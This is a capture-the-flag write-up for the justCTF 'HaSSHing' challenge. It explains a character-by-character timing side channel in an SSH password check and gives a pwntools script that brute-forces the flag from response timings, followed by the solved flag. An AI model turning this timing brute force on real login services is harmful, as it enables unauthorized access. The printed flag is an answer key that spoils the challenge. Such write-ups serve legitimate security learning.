https://ctftime.org/event/2342

# HaSSHing (PWN)

Interact with the keyboard or not, I don’t care; as only the flag will let you in - no chance of hash collisions here!

The flag consists only of the following characters: "CFT_cdhjlnstuw{}" and digits. Each character may appear multiple times.

ssh hasshing.nc.jctf.pro -l ctf -p 1337

## Solution

The password is compared character by character and correct characters take longer than incorrect ones.

1) Measure the time difference
2) Append the character with the highest time difference to the flag
3) Repeat

```python
from pwn import *
from datetime import datetime

def to_seconds(t):
    time_obj = datetime.strptime(t, "%H:%M:%S.%f")
    total_seconds = time_obj.hour * 3600 + time_obj.minute * 60 + time_obj.second + time_obj.microsecond / 1e6
    return total_seconds

characters =  "_cdhjlnstuw}" + string.digits + "CFT{"
flag = ""

while True:
    p = process(["ssh", "-l", "ctf", "-p", "1337", "localhost"], stdin=PTY, stdout=PTY, stderr=PTY)
    highest_time = 0
    best_char = "\x69"
    for char in characters:
        new_flag = flag + char
        p.readuntil(b"password: ")
        p.sendline(new_flag.encode())
        p.readline()
        start = to_seconds(p.readline()[13:].decode().split("]")[0])
        stop = to_seconds(p.readline()[13:].decode().split("]")[0])
        diff = stop - start
        if diff > highest_time:
            highest_time = diff
            best_char = char
    flag += best_char
    log.info(flag)
```

Note that this crashes for some unknown reason after a few characters.. So I just ran it over and over manually added the characters to the flag as I went.

## Flag
`justCTF{s1d3ch4nn3ls_4tw_79828}`

smiley 2024/06/15
